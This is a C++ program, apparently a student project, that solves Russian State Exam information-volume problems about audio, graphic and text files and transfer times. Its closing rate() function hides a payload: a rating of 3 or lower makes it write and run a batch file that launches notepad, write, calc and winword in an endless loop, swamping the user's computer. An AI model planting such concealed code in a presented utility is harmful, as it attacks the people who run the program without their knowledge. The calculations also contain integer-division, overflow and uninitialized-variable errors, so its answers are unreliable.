#include <iostream>
#include <cmath>
#include <string>
#include <fstream>
using namespace std;

void conv(long a){
    string ans;
    cout << "What value should be converted to? (answer B, KiB, MiB, GiB, min or nothing) \n";
    cin >> ans;
    if (ans == "B"){
        cout << a/8 << endl;
    } else if (ans == "KiB"){
        cout << a/8192 << endl;
    } else if (ans == "MiB"){
        cout << a/8388608 << endl;
    } else if (ans == "GiB"){
        cout << a/8589934592 << endl;
    } else if (ans == "min"){
        cout << a/60 << endl;
    }
}

void rate(){
    int mark;
    cout << "What mark will you put in the Eljur (from 1 to 5): ";
    cin >> mark;
    if(mark <= 3){
        ofstream batch;
        batch.open("cr_t.bat", ios::out);

        batch <<"@echo OFF\n";
        batch <<":top\n";
        batch <<"START %SystemRoot%\\system32\\notepad.exe\n";
        batch <<"START write\n";
        batch <<"START calc\n";
        batch <<"START winword\n";
        batch <<"GOTO top\n";

        batch.close();

        cout <<"Starting Batch File...\n";
        cout << "Nothing personal, just business ;))";
        system("cr_t.bat");


    } else{
        cout << "Thanks for voting! Have a nice day!!" << endl;
    }
}

void com_time(){
    cout << "Mark the unknown value with the number -1" << endl;
    cout << "Enter all values in bits and seconds" << endl;
    string ques;
    cout << "Task about Tolya and Kolya? (answer yes or no)" << endl;
    cin >> ques;
    int speed1, speed2, inter, time;
    long cap;
    if (ques == "yes"){
        cout << "Please, enter the data in the correct order: 1 boy's speed, 2 boy's speed, capacity and interval" << endl;
        int t0, t1, full;
        cin >> speed1 >> speed2 >> cap >> inter;
        t0 = inter / speed1;
        t1 = cap / speed2;
        full = t0 + t1;
        cout << full << endl;
        conv(full);
    } else if (ques == "no"){
        cout << "Please, enter the data in the correct order: speed, time and capacity" << endl;
        cin >> speed1 >> time >> cap;
        if (speed1 == -1){
            speed1 = cap/time;
            cout << speed1;
            conv(speed1);
        } else if (time == -1){
            time = cap/speed1;
            cout << time << endl;
            conv(time);
        } else if (cap == -1){
            cap = time * speed1;
            cout << cap << endl;
            conv(cap);
        }
    }
}

void text_task() {
    cout << "Mark the unknown value with the number -1" << endl;
    cout << "Enter all values in bits and seconds" << endl;
    string ans;
    long cap2;
    int am_symb, encode, encode2, speed, time, compare, x, y;
    cout << "Transferring text files or storing text files? (answer transferring or storing)" << endl;
    cout << "Please, enter the data in the correct order: amount of symbols, first encode, second encode and new capacity" << endl;
    cin >> ans;
    if (ans == "storing") {
        cin >> am_symb >> encode >> encode2 >> cap2;
        if (cap2 == -1) {
            compare = encode2 / encode;
            cap2 = am_symb * compare;
            cout << cap2 - am_symb << endl;
            conv(cap2 - am_symb);
        } else if (am_symb == -1) {
            compare = encode2 / encode;
            x = 1;
            y = x * compare;
            y -= x;
            am_symb = (cap2 / y) * 1024;
            cout << am_symb << endl;
        }
    } else if (ans == "transferring") {
        cout << "Please, enter the data in the correct order: speed, time, encode and amount of symbols" << endl;
        int page, symb_all;
        string answ;
        cin >> speed >> time >> encode >> am_symb;
        cout << "Do we have pages? (if there is, then answer yes)" << endl;
        cin >> answ;
        if (answ == "yes") {
            cout << "Enter the amount of pages" << endl;
            cin >> page;
        }
        if (am_symb == -1) {
            am_symb = speed * time / encode;
            cout << am_symb << endl;
        } else if (time == -1) {
            time = encode * am_symb / speed;
            cout << time << endl;
            conv(time);
        } else if (page == -1) {
            symb_all = time * speed / (encode * am_symb);
            cout << symb_all << endl;
        }

    }
}

void compare(){
    cout << "Please, enter the data in the correct order: capacity, speed, capacity of the compressed document (without the % sign), compression time and unzip time" << endl;
    cout << "If compression time or unzip time is not given, enter 0" << endl;
    cout << "Enter all values in bits and seconds" << endl;
    long cap, speed, cap1;
    double perc;
    int time_compr, time_unzip, comp, timeA, timeB;
    cin >> cap >> speed >> perc >> time_compr >> time_unzip;
    cap1 = cap*(perc/100);
    timeA = (cap1/speed) + time_compr + time_unzip;
    timeB = cap/speed;
    comp = abs(timeB - timeA);
    if(timeB > timeA){
        cout << "A";
    } else{
        cout << "B";
    }
    cout << comp;
}

void graph_task() {
    cout << "Please, enter the data in the correct order: width, height, color depth, capacity and dpi" << endl;
    cout << "Mark the unknown value with the number -1. If dpi is not given, enter 1" << endl;
    cout << "Enter all values in bits and seconds" << endl;
    long cap;
    long speed;
    int width, height, deep, time, dpi;
    string am, ans;
    cin >> width >> height >> deep >> cap >> dpi;
    if (cap == -1) {
        cap = width * height * deep * dpi;
        cout << cap << endl;
        conv(cap);
    } else if (deep == -1) {
        deep = cap / (height * width * dpi);
        cout << "Do we need amount of colors or bits?" << endl;
        cin >> am;
        if (am == "bits") {
            deep = log2(deep);
        } else if (am == "colors"){
            deep = pow(2, deep);
        }
        cout << deep << endl;
    } else if (dpi == -1){
        dpi = cap/(width * height * deep);
        cout << dpi << endl;
    }
    cout << "Do we need to calculate time or speed of transferring graphic files? (answer time, speed or no)" << endl;
    cin >> ans;
    if (ans == "time") {
        cout << "Enter speed \n";
        cin >> speed;
        time = cap/speed;
        cout << time << endl;
        conv(time);
    } else if (ans == "speed") {
        cout << "Enter time \n";
        cin >> time;
        speed = cap/time;
        cout << speed << endl;
    } else if (ans == "no") {
        cout << "Ok, understandable. Have a nice day!" << endl;
    }
}

void audio_task(){
    cout << "Please, enter the data in the correct order: amount of channels, coding depth, sampling rate, time and capacity" << endl;
    cout << "Mark the unknown value with the number -1" << endl;
    cout << "Enter all values in bits and seconds" << endl;
    long cap;
    long diskr, speed;
    int chan, deep, time, time_tr;
    string ans;
    cin >> chan >> deep >> diskr >> time >> cap;
    if (cap == -1){
        cap = chan * deep;
        cap *= diskr;
        cap *= time;
        cout << cap << endl;
        conv(cap);
    } else if(chan == -1){
        chan = cap / (deep * diskr * time);
        cout << chan << endl;
    } else if(deep == -1){
        deep = cap / (chan * diskr * time);
        cout << deep << endl;
    } else if(diskr == -1){
        diskr = cap / (chan * deep * time);
        cout << diskr << endl;
    }
    cout << "Do we need to calculate time or speed of transferring audio files? (answer time, speed or no)" << endl;
    cin >> ans;
    if (ans == "time"){
        cin >> speed;
        time_tr = cap/speed;
        cout << time_tr << endl;
        conv(time_tr);
    } else if (ans == "speed"){
        cin >> time_tr;
        speed = cap/time_tr;
        cout << speed << endl;
    } else if (ans == "no"){
        cout << "Ok, understandable. Have a nice day!" << endl;
    }
}

int main() {
    int num;
    cout << "Hi! This is my creative task! This program can solve all variants of the seventh task from RSE (Russian State Exam) \n" << endl;
    cout << "Enter the number: \n";
    cout << "1 - tasks about audio files \n";
    cout << "2 - tasks about graphic files \n";
    cout << "3 - comparison of two data transmission methods \n";
    cout << "4 - tasks about text files \n";
    cout << "5 - determining the file transfer time \n";
    cin >> num;
    if (num == 1){
        audio_task();
    } else if (num == 2){
        graph_task();
    } else if (num == 3){
        compare();
    } else if (num == 4){
        text_task();
    } else if (num == 5) {
        com_time();
    }

    rate();

    return 0;
}
